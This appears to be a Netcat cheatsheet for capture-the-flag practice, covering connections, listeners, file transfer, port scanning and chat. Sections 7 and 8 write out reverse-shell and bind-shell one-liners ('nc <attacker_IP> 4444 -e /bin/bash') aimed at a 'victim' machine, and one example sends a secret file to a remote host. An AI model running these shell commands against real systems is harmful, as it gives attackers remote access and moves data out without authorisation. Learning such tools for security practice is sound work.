**Netcat (nc) Cheatsheet** to help you with common use cases:  

## **Netcat (nc) Cheatsheet**  

### **1. Basic Connection**  
```bash
nc <host> <port>
```
- Example:  
  ```bash
  nc jupiter.challenges.picoctf.org 64287
  ```
- Connects to a remote server on the specified port.

### **2. Listen for Connections**  
```bash
nc -lvp <port>
```
- Example:  
  ```bash
  nc -lvp 4444
  ```
- Listens on port `4444` for incoming connections.  
  - `-l` → Listen mode  
  - `-v` → Verbose (detailed output)  
  - `-p` → Specify port  

### **3. Send a File**  
```bash
nc <host> <port> < file.txt
```
- Example:  
  ```bash
  nc 192.168.1.10 4444 < secret.txt
  ```
- Sends `secret.txt` to a remote machine listening on port `4444`.

### **4. Receive a File**  
```bash
nc -lvp <port> > file.txt
```
- Example:  
  ```bash
  nc -lvp 4444 > received.txt
  ```
- Receives a file and saves it as `received.txt`.

### **5. Create a Simple Chat**  
#### **On Machine 1 (Listener)**
```bash
nc -lvp 1234
```
#### **On Machine 2 (Sender)**
```bash
nc <Machine1_IP> 1234
```
- Now, anything typed on either machine is sent to the other.

### **6. Scan for Open Ports**  
```bash
nc -zv <host> <port_range>
```
- Example:  
  ```bash
  nc -zv 192.168.1.1 1-1000
  ```
- Checks which ports are open on the target.

### **7. Establish a Reverse Shell**  
#### **On Attacker's Machine (Listener)**
```bash
nc -lvp 4444
```
#### **On Victim’s Machine (Sender)**
```bash
nc <attacker_IP> 4444 -e /bin/bash
```
- Grants shell access to the attacker.

### **8. Establish a Bind Shell**  
#### **On Victim’s Machine (Listener)**
```bash
nc -lvp 4444 -e /bin/bash
```
#### **On Attacker’s Machine (Connect to Shell)**
```bash
nc <victim_IP> 4444
```

### **9. Transfer Files Using Netcat & Tar**  
#### **On Receiving Machine**
```bash
nc -lvp 4444 | tar -xvf -
```
#### **On Sending Machine**
```bash
tar -cvf - /path/to/files | nc <receiver_IP> 4444
```
- Sends and extracts files over Netcat.
